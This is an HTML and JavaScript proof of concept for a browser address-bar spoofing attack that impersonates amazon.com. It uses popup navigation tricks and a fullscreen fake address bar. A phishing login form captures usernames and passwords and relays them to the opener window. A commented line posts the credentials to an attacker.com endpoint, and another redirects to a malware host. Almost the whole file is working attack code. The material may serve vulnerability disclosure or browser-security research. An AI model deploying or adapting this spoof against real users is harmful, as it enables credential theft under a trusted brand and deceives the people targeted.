<!DOCTYPE html>
<html>
<head>
    <title>Interactive Spoof PoC</title>
</head>
<body>
    <a id="test" href="https://www.amazon.com/" onclick="foo()">https://www.amazon.com/</a>
</body>
<script>
var w;
var t;
var z;

if (location.href.indexOf("fake") !== -1) {
    // Make content interactive: Add phishing form and button
    document.body.innerHTML = `
        <h1>This website has moved to http://fake.com</h1>
        <p>Login to continue:</p>
        <form id="phishForm">
            <input type="text" placeholder="Username" id="user">
            <input type="password" placeholder="Password" id="pass">
            <button type="button" onclick="phish()">Submit</button>
        </form>
        <button onclick="maliciousClick()">Click for Deal</button>
    `;
    
    // Fullscreen spoof: Request fullscreen to hide real address bar
    document.body.requestFullscreen().then(() => {
        // Render fake address bar on top
        const fakeBar = document.createElement('div');
        fakeBar.style = 'position:fixed;top:0;left:0;width:100%;background:white;padding:5px;border-bottom:1px solid gray;z-index:9999;';
        fakeBar.innerHTML = '<span>https://www.amazon.com/</span> <img src="data:image/png;base64,...">'; // Base64 gembok icon
        document.body.prepend(fakeBar);
    }).catch(console.error);
    
    // Event handlers for interaction
    window.phish = function() {
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;
        alert('Phished: ' + user + '/' + pass); // Simulate send to attacker
        // Real: fetch('https://attacker.com/steal', {method:'POST', body:JSON.stringify({user,pass})});
        if (window.opener) window.opener.postMessage({type:'phished', data:{user,pass}}, '*'); // Send to opener
    };
    window.maliciousClick = function() {
        alert('Malicious action! Redirecting to malware...');
        // Real: location.href = 'https://malware.com';
    };
    
    // Listen for postMessage from opener if needed
    window.addEventListener('message', (e) => {
        if (e.data.type === 'command') console.log('Received from opener:', e.data);
    });
}

function foo() {
    document.getElementById("test").href = "#";
    w = window.open("?fake");
    t = setInterval(bar, 5);
}

function bar() {
    if (w.location.href !== 'about:blank') {
        alert("Redirecting");
        document.body.innerHTML = "<h1>Redirecting</h1>";
        slow();
        w.location.href = 'https://www.amazon.com/';
        clearInterval(t);
        z = setInterval(baz, 5);
    }
}

function baz() {
    try {
        w.location.href !== 'about:blank';
    } catch (e) {
        // Bypass non-interactive: Use URL freeze instead of 204
        w.location.href = 'https://www.amazon.com:9999'; // Unreachable port -> update address but keep interactive content
        
        // Chain with data: URI for fallback interactive spoof (some browsers show amazon-like)
        setTimeout(() => {
            w.location.href = 'data:text/html,<h1>Spoofed Amazon</h1><button onclick="alert(\'Interactive!\')">Click Me</button>#https://www.amazon.com/';
        }, 100);
        
        // Simulate PiP for window without address bar (add video in fake page if needed)
        // In fake: const vid = document.createElement('video'); vid.requestPictureInPicture();
        
        clearInterval(z);
    }
}

// Enhanced slowdown remains
function slow() {
    for (let i = 0; i < 50; i++) {
        let iframe = document.createElement("iframe");
        iframe.src = 'https://www.amazon.com/';
        iframe.style = 'display:none';
        document.body.appendChild(iframe);
    }
    let start = performance.now();
    while (performance.now() - start < 100) {}
}
</script>
</html>
